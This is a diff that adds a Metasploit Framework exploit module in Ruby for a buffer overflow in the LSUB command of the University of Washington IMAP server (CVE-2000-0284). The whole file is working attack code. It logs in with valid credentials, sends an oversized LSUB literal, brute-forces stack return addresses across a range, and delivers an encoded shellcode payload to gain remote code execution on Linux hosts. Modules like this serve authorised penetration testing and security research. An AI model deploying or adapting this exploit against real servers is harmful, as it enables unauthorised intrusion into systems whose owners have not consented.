@@ -1,0 +1,96 @@
+##
+# $Id: imap_uw_lsub.rb 8932 2010-03-26 19:00:23Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = GoodRanking
+
+	include Msf::Exploit::Brute
+	include Msf::Exploit::Remote::Imap
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'UoW IMAP server LSUB Buffer Overflow',
+			'Description'    => %q{
+					This module exploits a buffer overflow in the 'LSUB'
+				command of the University of Washington IMAP service.
+				This vulnerability can only be exploited with a valid username
+				and password.
+			},
+			'Author'         => [ 'patrick', 'jduck' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: 8932 $',
+			'References'     =>
+				[
+					[ 'CVE', '2000-0284' ],
+					[ 'OSVDB', '12037' ],
+					[ 'BID', '1110' ],
+					[ 'URL', 'http://www.milw0rm.com/exploits/284' ],
+				],
+			'Privileged'     => false,
+			'Payload'        =>
+				{
+					'Space'    => 964,
+					'BadChars' => "\x00\x0a\x0d\x2f",
+					'StackAdjustment' => -3500,
+				},
+			'Platform'       => 'linux',
+			'Targets'        =>
+				[
+					# ['RedHat 6.2 - IMAP4rev1 v12.264', { 'Ret' => 0xbffff310 }],
+					[ 'Linux Bruteforce',
+						{
+							'Platform'   => 'linux',
+							'Offset'     => 1064,
+							'Bruteforce' =>
+								{
+									'Start' => { 'Ret' => 0xbffffdfc },
+									'Stop'  => { 'Ret' => 0xbfa00000 },
+									'Step'  => 200
+								}
+						},
+					]
+				],
+			'DisclosureDate' => 'Apr 16 2000',
+			'DefaultTarget' => 0))
+	end
+
+	def check
+		connect
+		disconnect
+
+		if (banner =~ /IMAP4rev1 v12.264/)
+			return Exploit::CheckCode::Vulnerable
+		end
+		return Exploit::CheckCode::Safe
+
+	end
+
+	def brute_exploit(addresses)
+		print_status("Trying 0x%.8x ..." % addresses['Ret'])
+
+		if (not connect_login)
+			raise RuntimeError, "Unable to log in!"
+		end
+
+		req = "a002 LSUB \"\" {%d}\r\n" % target['Offset']
+		sock.put(req)
+		buf = sock.get_once
+
+		sploit = payload.encoded + rand_text_alphanumeric(64) + [addresses['Ret']].pack('V') + rand_text_alphanumeric(32) + "\r\n"
+		sock.put(sploit)
+
+		handler
+		disconnect
+	end
+
+end
